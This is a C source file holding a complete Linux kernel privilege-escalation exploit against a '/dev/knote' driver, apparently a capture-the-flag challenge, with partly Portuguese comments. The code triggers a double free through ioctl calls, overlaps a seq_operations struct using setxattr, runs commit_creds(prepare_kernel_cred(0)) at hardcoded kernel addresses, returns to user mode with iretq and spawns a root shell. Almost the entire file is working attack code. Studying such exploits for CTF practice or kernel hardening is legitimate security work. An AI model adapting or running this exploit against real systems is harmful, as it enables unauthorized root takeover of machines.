#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>

#define KNOTE_CREATE 0x1337
#define KNOTE_DELETE 0x1338
#define KNOTE_READ 0x1339
#define KNOTE_ENCRYPT 0x133a
#define KNOTE_DECRYPT 0x133b

typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

int dev;
int seq_fd;

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void open_dev(){
    // Abrir com O_RDWR impede de spawnar uma shell como root. Precisa abrir como O_RDONLY
    dev = open("/dev/knote", O_RDONLY);
    puts("[*] Oppened /dev/knote");
}

void create_note(unsigned long idx, char* data, size_t len){
    knote_user note = {
        .idx = idx,
        .data = data,
        .len = len
    };

    ioctl(dev, KNOTE_CREATE, &note);
}

void delete_note(unsigned int idx){
    knote_user note = {
        .idx = idx
    };

    ioctl(dev, KNOTE_DELETE, &note);
}

void pwn(){
    close(seq_fd);
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pwn;

void privesc(){
    __asm__(
        ".intel_syntax noprefix;" // define intel syntax
        "movabs rax, 0xffffffff81053c50;" // prepare_kernel_cred function address
        "xor rdi, rdi;" // set rdi to 0, by calling convention, rdi is the first function argument
        "call rax;" // call rax to execute prepare_kernel_cred
        "mov rdi, rax;" // prepare_kernel_cred function returns value to rax; so mov the value of rax to rdi as first argument of commit_creds
        "movabs rax, 0xffffffff81053a30;" // mov absolute address of commit_creds to rax
        "call rax;" // call commit_creds function
        "swapgs;" // swap gs register to user mode

        // setting up RIP|CS|RFLAGS|SP|SS registers for iretq. Going back to user mode
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"

        "iretq;" // context switch to user mode

        ".att_syntax;"
    );
}


int main(){

    char buf[0x20];

    // Isso precisa ser setado pois o setxattr ira colocar o valor do ponteiro passado no terceiro argumento na primeira posiçao
    // do struct seq_operations. Para visualizar istom, voce pode dar um breakpoint em seq_file e visualizar se o ponteiro
    // alocado pelo setxattr esta com o valor de sua funçao privesc.
    /*
    
    */
    void *privesc_prt = &privesc;

    save_registers_state();
    open_dev();

    /* Create 2 allocations and trigger error in copy_from_user so those allocations will be freed, but reference to struct pointer 
       will not be deleted.
    
    kfree(knotes[ku.idx]->data);
    kfree(knotes[ku.idx]);
    mutex_unlock(&knote_ioctl_lock);
    return -EFAULT; */

    puts("Creating first note");
    create_note(0, (char *)0x0, 4);

    /* Now, delete first element of knote array in order to trigger a double free
        
        kfree(knotes[ku.idx]->data);
        kfree(knotes[ku.idx]);
        knotes[ku.idx] = NULL; */

    puts("Deleting note");
    delete_note(0);
    // 0xffff88801ee5ed98
    // 


    // Now the next 2 kmalloc-32 will get the same address. So We need to allocate some kernel struct we can control.
    // This will allocate seq_operations struct
    puts("Allocating seq_operations struct");
    seq_fd = open("/proc/self/stat", O_RDONLY);

    // Then, we will allocate another 32 bytes struct in the same place of seq_operations struct and put our 3rd argument
    // in the first 8 bytes of the allocated region.
    //
    // int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
    puts("Allocating setattrx");
    setxattr("/proc/self/stat", "exploit", &privesc_prt, 32, 0);

    // Trigger seq_operations start
    // https://elixir.bootlin.com/linux/v5.8.3/source/fs/seq_file.c#L203
    // p = m->op->start(m, &m->index)

    puts("Triggering seq_operations->start");
    read(seq_fd, NULL, 1);

    return 0;
}

